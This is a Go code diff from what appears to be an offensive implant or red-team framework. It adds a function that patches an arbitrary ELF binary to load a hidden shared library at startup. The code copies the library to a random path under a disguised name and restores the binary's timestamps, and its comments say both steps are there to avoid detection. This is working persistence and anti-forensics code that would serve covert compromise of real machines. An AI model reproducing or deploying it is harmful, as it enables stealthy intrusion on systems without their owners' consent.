@@ -283,3 +283,71 @@ func patcher() (err error) {
 	}
 	return
 }
+
+// ElfPatcher patches an ELF file to load a specific SO file on startup
+// This function allows users to patch arbitrary ELF files with custom SO libraries
+func ElfPatcher(elfPath, soPath string) error {
+	// Validate input paths
+	if !util.IsFileExist(elfPath) {
+		return fmt.Errorf("ELF file %s does not exist", elfPath)
+	}
+
+	if !util.IsFileExist(soPath) {
+		return fmt.Errorf("SO file %s does not exist", soPath)
+	}
+
+	// Create backup of original ELF file
+	backupPath := elfPath + ".backup"
+	if !util.IsFileExist(backupPath) {
+		err := util.Copy(elfPath, backupPath)
+		if err != nil {
+			return fmt.Errorf("failed to create backup of %s: %v", elfPath, err)
+		}
+		log.Printf("Created backup: %s", backupPath)
+	}
+
+	// Generate a random storage location for the SO file
+	randomDir, err := common.GetRandomWritablePath()
+	if err != nil {
+		return fmt.Errorf("failed to get random writable path: %v", err)
+	}
+
+	// Ensure the directory exists
+	err = os.MkdirAll(randomDir, 0755)
+	if err != nil {
+		return fmt.Errorf("failed to create directory %s: %v", randomDir, err)
+	}
+
+	// Generate random SO filename to avoid detection
+	randomSOName := common.NameTheLibrary()
+	if randomSOName == "" {
+		randomSOName = fmt.Sprintf("lib%s.so.%d", util.RandStr(8), util.RandInt(1, 99))
+	}
+
+	finalSOPath := fmt.Sprintf("%s/%s", randomDir, randomSOName)
+
+	// Copy SO file to random location
+	err = util.Copy(soPath, finalSOPath)
+	if err != nil {
+		return fmt.Errorf("failed to copy SO file to %s: %v", finalSOPath, err)
+	}
+
+	log.Printf("Copied SO file to: %s", finalSOPath)
+
+	// Patch the ELF file to load our SO
+	err = exeutil.AddDTNeeded(elfPath, finalSOPath)
+	if err != nil {
+		// Restore backup on failure
+		util.Copy(backupPath, elfPath)
+		return fmt.Errorf("failed to patch ELF file %s: %v", elfPath, err)
+	}
+
+	// Restore original file timestamps to avoid detection
+	err = agentutils.RestoreFileTimes(elfPath)
+	if err != nil {
+		log.Printf("Warning: failed to restore file times for %s: %v", elfPath, err)
+	}
+
+	log.Printf("Successfully patched %s to load %s", elfPath, finalSOPath)
+	return nil
+}
